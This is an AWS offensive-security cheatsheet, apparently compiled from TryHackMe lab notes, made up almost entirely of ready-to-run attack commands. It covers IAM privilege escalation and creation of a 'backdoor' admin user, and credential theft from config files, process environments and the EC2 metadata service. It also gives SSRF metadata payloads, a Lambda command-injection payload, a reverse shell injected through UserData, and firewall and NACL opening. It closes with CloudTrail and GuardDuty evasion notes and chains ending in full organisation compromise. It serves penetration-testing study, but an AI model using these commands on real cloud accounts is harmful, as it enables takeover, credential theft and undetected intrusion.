---
title: "AWS Attacks Cheatsheet"
type: cheatsheet
tags: [aws, cheatsheet, cloud, ec2, enumeration, exploitation, iam, s3, thm]
date_created: 2026-05-08
date_updated: 2026-05-08
sources: [thm-aws-intro, thm-aws-iam-intro, thm-aws-iam-privesc, thm-aws-core-services, thm-aws-serverless]
---

# AWS Attacks Cheatsheet

See detailed pages: [[aws-attacks]] | [[cloud-iam-attacks]]

---

## AWS CLI Setup

```bash
# Configure default profile
aws configure
# Prompts for: Access Key ID, Secret Access Key, Region, Output format

# Configure named profile
aws configure --profile profile-name

# Set session token for temporary credentials (after configure)
aws configure set aws_session_token TOKEN --profile profile-name

# Use environment variables (no config file needed)
export AWS_ACCESS_KEY_ID=AKIA...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...       # only for temporary/ASIA keys
export AWS_DEFAULT_REGION=us-east-1

# Credentials file location
cat ~/.aws/credentials
# [default]
# aws_access_key_id = AKIA...
# aws_secret_access_key = ...

# Role session cache (SSO / CLI assume-role)
ls ~/.aws/cli/cache/
```

---

## Identity and Reconnaissance

```bash
# Who am I right now? (the AWS equivalent of whoami)
aws sts get-caller-identity

# Which account does this access key belong to? (works without auth to target)
aws sts get-access-key-info --access-key-id AKIAEXAMPLE123456789

# Describe the Organization (reveals management account email)
aws organizations describe-organization

# Check account password policy
aws iam get-account-password-policy
```

**Key identifier prefixes**:
| Prefix | Entity |
|--------|--------|
| `AKIA` | Long-term IAM User access key |
| `ASIA` | Temporary (STS) session key |
| `AROA` | IAM Role unique ID |
| `AIDA` | IAM User unique ID |
| `AGPA` | IAM Group unique ID |

---

## IAM Enumeration

```bash
# Users
aws iam list-users
aws iam get-user --user-name USERNAME
aws iam list-access-keys --user-name USERNAME

# Roles
aws iam list-roles
aws iam get-role --role-name ROLENAME

# Groups
aws iam list-groups
aws iam get-group --group-name GROUPNAME
aws iam list-groups-for-user --user-name USERNAME

# Policies on a user
aws iam list-attached-user-policies --user-name USERNAME
aws iam list-user-policies --user-name USERNAME          # inline
aws iam get-user-policy --user-name USERNAME --policy-name POLICYNAME

# Policies on a role
aws iam list-attached-role-policies --role-name ROLENAME
aws iam list-role-policies --role-name ROLENAME          # inline
aws iam get-role-policy --role-name ROLENAME --policy-name POLICYNAME

# Inspect a managed policy
aws iam get-policy --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
aws iam get-policy-version \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess \
  --version-id v1

# Simulate permissions for a principal
aws iam simulate-principal-policy \
  --policy-source-arn arn:aws:iam::123456789012:user/USERNAME \
  --action-names s3:GetObject ec2:DescribeInstances iam:CreateUser \
  --resource-arns "*"

# Lambda function: get role and its policies
ROLE=$(aws lambda get-function --function-name FUNCTION_NAME \
  --query Configuration.Role --output text | awk -F/ '{print $NF}')
aws iam list-attached-role-policies --role-name $ROLE
aws iam list-role-policies --role-name $ROLE
```

---

## STS Role Assumption

```bash
# Assume a role (get temporary credentials)
aws sts assume-role \
  --role-arn arn:aws:iam::123456789012:role/target-role \
  --role-session-name MySession

# Export the returned credentials (replace values from above output)
export AWS_ACCESS_KEY_ID=ASIA...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...

# Verify you're using the new role
aws sts get-caller-identity

# Get session token (with MFA if required)
aws sts get-session-token \
  --serial-number arn:aws:iam::123456789012:mfa/username \
  --token-code 123456

# Get basic session token (no MFA)
aws sts get-session-token
```

---

## IAM Privilege Escalation Commands

```bash
# 1. Attach AdministratorAccess to self (requires iam:AttachUserPolicy)
aws iam attach-user-policy \
  --user-name YOUR_USERNAME \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# 2. Overwrite existing policy with wildcard (requires iam:CreatePolicyVersion)
aws iam create-policy-version \
  --policy-arn arn:aws:iam::123456789012:policy/YourPolicy \
  --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}' \
  --set-as-default

# 3. Create new access keys for a privileged user (requires iam:CreateAccessKey)
aws iam create-access-key --user-name admin-user

# 4. Set console password for another user (requires iam:UpdateLoginProfile)
aws iam update-login-profile \
  --user-name admin-user \
  --password 'NewP@ssword123!'

# 5. Add self to admin group (requires iam:AddUserToGroup)
aws iam add-user-to-group \
  --user-name YOUR_USERNAME \
  --group-name AdminGroup

# 6. Attach admin policy to assumable role, then assume it
aws iam attach-role-policy \
  --role-name assumable-role \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
aws sts assume-role \
  --role-arn arn:aws:iam::123456789012:role/assumable-role \
  --role-session-name privesc

# 7. Create user and access key (requires iam:CreateUser + iam:CreateAccessKey)
aws iam create-user --user-name backdoor
aws iam attach-user-policy \
  --user-name backdoor \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
aws iam create-access-key --user-name backdoor
```

---

## Credential Discovery on Compromised Systems

```bash
# Environment variables
env | grep -i aws
env | grep -E 'AWS_|AMAZON_'

# Credentials file
cat ~/.aws/credentials
cat ~/.aws/config

# Role session cache
ls ~/.aws/cli/cache/
cat ~/.aws/cli/cache/*.json

# Docker/container environment
cat /proc/1/environ | tr '\0' '\n' | grep AWS

# EC2 IMDS (from inside an EC2 instance — IMDSv1)
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME

# EC2 IMDS (IMDSv2 — requires PUT first)
TOKEN=$(curl -s -X PUT http://169.254.169.254/latest/api/token \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME

# ECS task metadata credentials
curl 169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI

# Lambda/CloudShell credentials
curl $AWS_CONTAINER_CREDENTIALS_FULL_URI \
  -H "X-aws-ec2-metadata-token: $AWS_CONTAINER_AUTHORIZATION_TOKEN"

# Other IMDS data of interest
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/user-data          # startup scripts (may have secrets)
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/instance-id
```

---

## S3 Enumeration and Exploitation

```bash
# List all buckets in the account
aws s3 ls

# List objects in a bucket
aws s3 ls s3://bucket-name
aws s3 ls s3://bucket-name --recursive

# Download entire bucket (no credentials — proves public access)
aws s3 sync s3://bucket-name . --no-sign-request

# Download entire bucket (with credentials)
aws s3 sync s3://bucket-name ./local-dir

# Get a specific object
aws s3 cp s3://bucket-name/path/to/file .

# Check if bucket is public
aws s3api get-bucket-policy-status --bucket bucket-name

# Read bucket policy
aws s3api get-bucket-policy --bucket bucket-name --query Policy --output text | jq

# Read bucket ACL
aws s3api get-bucket-acl --bucket bucket-name

# Check ownership controls
aws s3api get-bucket-ownership-controls --bucket bucket-name

# Upload a file (requires write permission)
aws s3 cp local-file.txt s3://bucket-name/
aws s3 cp local-file.txt s3://bucket-name/ --no-sign-request  # public write

# Put a malicious bucket policy (requires s3:PutBucketPolicy)
aws s3api put-bucket-policy --bucket bucket-name --policy file://policy.json

# DNS-based bucket discovery
nslookup target-org.s3.amazonaws.com
nslookup assets.target.com.s3.amazonaws.com

# Restore EC2 AMI found in a public bucket
aws ec2 create-restore-image-task \
  --object-key ami-XXXXXXXXXXXXXXXXX.bin \
  --bucket public-bucket-name \
  --name recovered-ami
```

---

## EC2 Metadata SSRF Payloads

Use these URLs as the SSRF payload when the target server fetches user-supplied URLs and returns the response:

```
# Step 1: Get role name
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Step 2: Get credentials for that role
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME_HERE

# Other useful IMDS endpoints
http://169.254.169.254/latest/user-data
http://169.254.169.254/latest/meta-data/instance-id
http://169.254.169.254/latest/meta-data/placement/availability-zone
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/network/interfaces/macs/
```

The credentials response looks like:
```json
{
  "Code": "Success",
  "Type": "AWS-HMAC",
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "...",
  "Token": "...",
  "Expiration": "2024-01-01T00:00:00Z"
}
```

---

## EC2 Enumeration and Exploitation

```bash
# List instances with useful fields
aws ec2 describe-instances \
  --query 'Reservations[*].Instances[*].[Tags[?Key==`Name`].Value,InstanceId,State.Name,PublicIpAddress,PrivateIpAddress]' \
  --output text | sed 'N;s/\n/ /'

# Get UserData for a specific instance (may contain secrets)
aws ec2 describe-instance-attribute \
  --instance-id i-0123456789abcdef0 \
  --attribute userData \
  --query UserData --output text | base64 -d

# Get UserData for ALL instances
LIST=$(aws ec2 describe-instances \
  --query Reservations[].Instances[].InstanceId --output text)
for i in $LIST; do
  aws ec2 describe-instance-attribute --instance-id $i \
    --attribute userData --query UserData --output text \
    | base64 -d > $i-USERDATA.txt
done

# List ENIs (full picture of VPC network)
aws ec2 describe-network-interfaces

# List snapshots from a specific account
aws ec2 describe-snapshots --owner-ids ACCOUNT_ID

# Modify UserData (inject reverse shell — requires stop first)
aws ec2 stop-instances --instance-ids INSTANCE_ID
aws ec2 modify-instance-attribute \
  --instance-id INSTANCE_ID \
  --attribute userData \
  --value file://reverse-shell.enc    # base64-encoded shell script
aws ec2 start-instances --instance-ids INSTANCE_ID

# Create volume from snapshot and attach
aws ec2 create-volume \
  --snapshot-id snap-0123456789abcdef0 \
  --volume-type gp3 \
  --availability-zone us-east-1c
aws ec2 attach-volume \
  --device /dev/sdh \
  --instance-id INSTANCE_ID \
  --volume-id VOLUME_ID

# Allocate and assign a public IP to a private instance
aws ec2 allocate-address
aws ec2 associate-address \
  --network-interface-id eni-0123456789abcdef0 \
  --allocation-id eipalloc-0123456789abcdef0

# Modify security group (open all ports to the world)
aws ec2 authorize-security-group-ingress \
  --group-id sg-0123456789abcdef0 \
  --protocol all --port 0-65535 --cidr 0.0.0.0/0

# Modify route table (make private subnet public)
aws ec2 create-route \
  --route-table-id rtb-0123456789abcdef0 \
  --destination-cidr-block 0.0.0.0/0 \
  --gateway-id igw-0123456789abcdef0

# NACL bypass (prepend allow-all at rule 1)
aws ec2 create-network-acl-entry \
  --cidr-block 0.0.0.0/0 --ingress --protocol -1 \
  --rule-action allow --rule-number 1 \
  --network-acl-id acl-0123456789abcdef0
aws ec2 create-network-acl-entry \
  --cidr-block 0.0.0.0/0 --egress --protocol -1 \
  --rule-action allow --rule-number 1 \
  --network-acl-id acl-0123456789abcdef0
```

---

## Lambda Enumeration and Exploitation

```bash
# List all Lambda functions (shows runtime, role, env vars, VPC config)
aws lambda list-functions

# Get full function details including code location
aws lambda get-function --function-name FUNCTION_NAME

# Download function code (via pre-signed S3 URL from get-function output)
URL=$(aws lambda get-function --function-name FUNCTION_NAME \
  --query Code.Location --output text)
curl -s "$URL" -o function.zip
unzip function.zip -d function-code/

# Get function resource-based policy (who can invoke it)
aws lambda get-policy \
  --function-name FUNCTION_NAME \
  --query Policy --output text | jq

# Invoke a function (synchronous)
aws lambda invoke \
  --function-name FUNCTION_NAME \
  --payload '{"key": "value"}' \
  output.json
cat output.json

# Invoke with file payload
aws lambda invoke \
  --function-name FUNCTION_NAME \
  --payload fileb://payload.json \
  output.json

# Command injection payload (when function runs unsanitized shell commands)
cat > payload.json <<'EOF'
{"prefix": " ; env "}
EOF
aws lambda invoke --function-name vulnerable-function \
  --payload fileb://payload.json output.json
cat output.json | jq -r . | grep AWS

# Update function code (requires lambda:UpdateFunctionCode)
aws lambda update-function-code \
  --function-name FUNCTION_NAME \
  --zip-file fileb://malicious.zip

# List Lambda layers
aws lambda list-layers
aws lambda list-layer-versions --layer-name LAYER_NAME

# Environment variable extraction (from inside Lambda via code injection)
python3 -c "import os; print(dict(os.environ))"
```

**Key Lambda environment variables** (available inside execution environment):

| Variable | Content |
|----------|---------|
| `AWS_ACCESS_KEY_ID` | Temporary key ID for execution role |
| `AWS_SECRET_ACCESS_KEY` | Temporary secret for execution role |
| `AWS_SESSION_TOKEN` | Session token for execution role |
| `AWS_REGION` | Region the function runs in |
| `AWS_LAMBDA_FUNCTION_NAME` | Function name |
| `AWS_LAMBDA_FUNCTION_MEMORY_SIZE` | Allocated memory |
| `_HANDLER` | Handler path |

---

## API Gateway Enumeration

```bash
# List REST APIs
aws apigateway get-rest-apis

# List stages (dev, staging, prod, etc.)
aws apigateway get-stages --rest-api-id API_ID

# List resources and methods
aws apigateway get-resources --rest-api-id API_ID

# Get a specific stage
aws apigateway get-stage --rest-api-id API_ID --stage-name prod

# Invoke API endpoint with custom header
curl https://API_ID.execute-api.REGION.amazonaws.com/STAGE/resource \
  -H "authorizationToken: testing123"

# Deploy FireProx for IP rotation
git clone https://github.com/ustayready/fireprox
cd fireprox && pip3 install -r requirements.txt
python3 fire.py --command create --url https://api.target.com
python3 fire.py --command list
python3 fire.py --command delete --api_id API_ID

# Lambda authorizer path bypass (greedy wildcard exploitation)
# If token grants access to */test/*, try accessing /prod/test/
curl https://api.target.com/test/test/ -H "authorizationToken:testing123"   # works
curl https://api.target.com/prod/test/ -H "authorizationToken:testing123"   # may also work!
```

---

## Unauthenticated IAM Enumeration (Quiet Riot)

```bash
pip3 install quiet-riot

# Enumerate IAM users in target account
quiet_riot --scan 5
# Choose option 2 (IAM Users), enter target account ID, provide wordlist

# Enumerate IAM roles in target account
quiet_riot --scan 5
# Choose option 1 (IAM Roles), enter target account ID, provide wordlist

# Enumerate root user email addresses via S3 ACLs
quiet_riot --s 4
# Enter email format, provide wordlist and domain

# Enumerate enabled AWS services via service-linked roles
quiet_riot --s 3
# Enter target account ID — reveals GuardDuty, Organizations, Support, etc.

# Example: determine account ID from a known AKIA key (no auth to target needed)
aws sts get-access-key-info --access-key-id AKIAEXAMPLE123456789
```

---

## VPC Network Reconnaissance

```bash
# List all VPCs
aws ec2 describe-vpcs

# List subnets
aws ec2 describe-subnets

# List route tables
aws ec2 describe-route-tables

# List internet gateways
aws ec2 describe-internet-gateways

# List security groups
aws ec2 describe-security-groups

# List NACLs
aws ec2 describe-network-acls

# List VPC endpoints
aws ec2 describe-vpc-endpoints

# List prefix lists (maps AWS service CIDR ranges)
aws ec2 describe-prefix-lists

# List load balancers
aws elbv2 describe-load-balancers
aws elbv2 describe-load-balancers \
  --query LoadBalancers[].DNSName --output text

# Find CloudFormation stack outputs (useful for discovering internal resources)
aws cloudformation describe-stacks \
  --query "Stacks[?contains(StackName,'target')].Outputs"
```

---

## CloudTrail Detection Evasion Notes

- `aws:SourceIp` in CloudTrail reveals your IP — use FireProx or VPN
- `sts:GetCallerIdentity` is logged but low-signal — still appears in CloudTrail
- GuardDuty triggers on: credentials used from unexpected location, port scanning, crypto mining, DNS exfiltration, unusual API call patterns
- Using regional STS endpoints (`sts.us-east-1.amazonaws.com`) may reduce some detection
- Pacu has `--no-cloudtrail` aware modules that avoid high-detection API calls

---

## Common Attack Chains

**SSRF to Admin**:
```
SSRF vulnerability → IMDS credentials → STS get-caller-identity → IAM enumeration
→ iam:AttachUserPolicy or iam:PassRole + ec2:RunInstances → AdministratorAccess
```

**Public S3 to Code Execution**:
```
Public bucket discovered → AMI binary or Lambda zip found → Restore/download code
→ Extract secrets/credentials from code → Or deploy modified code for RCE
```

**Lambda Pivot (VPC-restricted bucket)**:
```
Read-only creds → lambda:list-functions → Command injection in vulnerable Lambda
→ Steal Lambda execution role creds → lambda:UpdateFunctionCode on VPC Lambda
→ Invoke modified VPC Lambda → Read VPC-endpoint-restricted S3 bucket
```

**Leaked AKIA to Full Compromise**:
```
AKIA found in GitHub/config → aws sts get-caller-identity → iam enumeration
→ iam:CreatePolicyVersion / iam:AttachUserPolicy → AdministratorAccess
→ sts:AssumeRole OrganizationAccountAccessRole → Full org compromise
```
